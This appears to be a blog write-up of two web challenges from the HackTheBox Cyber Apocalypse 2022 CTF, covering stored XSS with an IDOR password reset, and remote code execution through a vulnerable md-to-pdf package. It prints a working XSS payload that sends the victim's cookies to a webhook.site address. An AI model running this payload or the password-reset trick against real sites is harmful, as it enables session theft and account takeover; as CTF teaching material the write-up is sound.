## HackTheBox Cyber Apocalypse 2022 Intergalactic Chase

I’m back to HTB! This time with a new team, called HackinKaNalang. Despite of our busy schedule we manage to participate in this year Cyber Apocalypse CTF.

-------------------------------------------------------
#### Web
- [Web 300 : Kryptos Support ](#kryptos_support)
- [Web 300 : BlinkerFluids ](#blinkerfluids)

------------------------------------------------------
## Kryptos_Support
![](web1/1.png)

During my enumeration I got a field wherein you can submit via form, and another page which is a login portal. 

![](web1/11.png)

I submitted a test content and got this:

![](web1/2.png)

The response above gave me a hint of possible XSS attack. Which leads me to get an Admin Cookies/Session. I sent a crafted xss payload using https://webhook.site. 

```
<script>
document.write('<img src="https://webhook.site/4805b428-e4e9-4754-9ff1-74f3b03e040d?c='+document.cookie+'" />');
</script>
```

Now I have the session cookies. 

![](web1/3.png)

I installed a cookie editor to use the session that came from the results of my XSS attack.

![](web1/4.png)

Then redirected to the admin panel. I didn't find any field or upload files, just the ticket that I submitted.

![](web1/44.png)

Upon checking the links, I found a change password field. I tried to change the password of the current account, that's when I  noticed that the account I compromised is a moderator.

![](web1/5.png)

So I thought that maybe there is an Admin account for this application.
Next is enabling the inspect element functions of the browser to check some hidden fields, and that where I got the UID.

![](web1/6.png)

I decided to edit the value to 1 and supplied my chosen password and click submit, then I  received this message below

![](web1/7.png)

I login using admin and my chosen password and automatically redirected to Home Page with a Flag.

![](web1/flag.png)

Conclusion: The application is vulnerable to Persistent XSS and IDOR or known as Insicure Direct Object Reference.
------------------------------------------------------


------------------------------------------------------
## BlinkerFluids
![](web2/1.png)

The challenge contains of web app and a source code.
The page contains of markdown editor and after submission it convert the text to pdf.

Reviewing the source code and its node.js, basically checking the packages.json for possible vulnerable packages, that's where I  notice the md-to-pdf package.

![](web2/2.png)

Then I tried to searched for possible exploit and found RCE on snyk.io : https://security.snyk.io/vuln/SNYK-JS-MDTOPDF-1657880

![](web2/22.png)

Which leads me to check to the github issues where I found an interesting comment.

![](web2/23.png)

I created a RCE code and supplied it to the markdown editor and I click submit.

![](web2/3.png)

Then, I created another markdown to check if the rce2.txt is created, and it listed all the files which the rce2.txt has been created.

![](web2/4.png)

I created a final markdown content to read the rce2.txt, then i got the flag.

![](web2/flag.png)

Conclusion: Package vulnerabilities helps me get the flag which highlighted the importance of source code review.
------------------------------------------------------